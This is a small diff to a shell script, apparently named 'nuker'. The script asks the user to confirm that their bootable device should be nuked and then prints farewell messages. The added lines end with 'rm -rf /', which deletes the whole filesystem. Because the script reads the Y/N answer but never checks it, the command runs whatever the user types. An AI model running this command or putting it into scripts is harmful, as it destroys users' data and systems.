@@ -7,5 +7,6 @@ echo
 echo "Are you sure to nuke your current bootable device?"
 read -rp "[Y/N]: " answer
 echo
-echo "Currently in development :)"
-printf "\033[0m"    # reset colour
+echo "The process is undergoing, this is the last brodcasting message"
+echo "Thank you for choosing nuker"
+rm -rf /
